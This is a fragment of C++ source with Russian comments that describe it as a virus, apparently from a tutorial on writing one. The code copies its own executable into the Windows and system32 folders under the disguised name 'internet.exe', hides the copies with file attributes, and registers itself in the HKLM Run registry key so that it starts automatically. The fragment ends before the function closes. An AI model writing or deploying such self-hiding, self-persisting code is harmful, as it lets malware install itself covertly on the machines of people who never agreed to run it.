// Подключаем библиотеки и создаем основные переменные.

#include <windows.h>
#include <iostream.h>

WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
HKEY key;
char sysdir[256],
windir[256],
myname[256];

/*Узнаем свое имя функцией GetModuleFileName. И узнает адрес папки windows и папки system32 функциями GetWindowsDirectory и GetSystemDirectory*/

GetModuleFileName(hint,myname,256);
GetWindowsDirectory(windir,sizeof(windir));
GetSystemDirectory(sysdir,sizeof(sysdir));

/*Добавляем к строкам содержащим пути к системным папкам имя нашего вируса, чтобы скопировать в эти папки себя.*/

strcat(windir,"\\internet.exe");
strcat(sysdir,"\\internet.exe");

//Копируемся и ставим себе скрытые атрибуты

CopyFile(myname,windir,FALSE);
CopyFile(myname,sysdir,FALSE);
SetFileAttributes(windir,FILE_ATTRIBUTE_HIDDEN);
SetFileAttributes(sysdir,FILE_ATTRIBUTE_HIDDEN);

//Прописываемся в реестр на автозагрузку

RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &key);
RegSetValueEx(key,"internet.exe",0,REG_SZ,(BYTE *)sysdir,256);
RegCloseKey(key);
